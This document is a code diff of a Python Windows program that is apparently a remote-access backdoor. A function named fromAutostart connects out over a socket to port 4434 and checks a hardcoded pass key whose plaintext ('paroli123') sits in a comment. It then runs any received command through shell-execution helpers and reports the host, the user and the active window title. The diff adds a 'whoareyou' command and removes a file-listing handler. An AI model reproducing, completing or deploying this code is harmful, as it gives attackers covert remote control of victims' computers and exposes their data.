@@ -14,7 +14,6 @@ PORT = 4434
 active = False
 data = ''
 passKey = r'1705a7f91b40320a19db18912b72148e' # key: paroli123
-unlocked = False
 
 # INIT Widnows DLL's
 Kernel32 = ctypes.windll.kernel32
@@ -86,11 +85,11 @@ def GetWindowTitle():
     return buff.value
 
 def iam():
-    global locked
+    global active
     data = {}
     data['ostype'] = str(sys.platform)
     data['os'] = str(platform.platform())
-    data['protection'] = str(unlocked)
+    data['protection'] = str(active)
     data['user'] = str(platform.node())
     data['activewindowtitle'] = GetWindowTitle()
     return str(data)
@@ -98,7 +97,6 @@ def iam():
 def fromAutostart():
     global active
     global passKey
-    global unlocked
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -121,12 +119,12 @@ def fromAutostart():
 
                     while active:
                         data = Receive(s)
-                        if data == '':
-                            time.sleep(0.02)
                         if data == "terminate":
                             Send(s, "quitted")
                             active = False
                             break
+                        if data == 'whoareyou':
+                            stdoutput = iam()
                         elif data.startswith("cd "):
                             try:
                                 os.chdir(data[3:])
@@ -137,32 +135,17 @@ def fromAutostart():
                             stdoutput = ''
                         elif data.startswith("runscript"):
                             stdoutput = Execute(data[10:])
-                        elif data.startswith("ls"):
-                            string = {}
-                            try:
-                                for n, i in enumerate(os.listdir(u'.')):
-                                    string[n] = {}
-                                    string[n]['name'] = i
-                                    string[n]['type'] = os.path.isfile(i)
-                                    string[n]['size'] = os.path.getsize(i)
-                                    string[n]['modified'] = time.ctime(os.path.getmtime(i))
-                                    string[n]['hidden'] = has_hidden_attribute(i)
-                                stdoutput = str(string)
-                            except WindowsError:
-                                stdoutput = 'Access is denied'
                         else:
                             stdoutput = Exec(data)
-                        stdoutput = '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>\n\n'+stdoutput
                         Send(s, stdoutput)
                     if data == "terminate":
                         break
                     time.sleep(3)
                 else:
-                    Send(s, 'Access Denied')
+                    Send(s, 'Authorization Failed')
             except socket.error:
                 s.close()
                 active = False
-                unlocked = False
                 time.sleep(10)
                 break
 
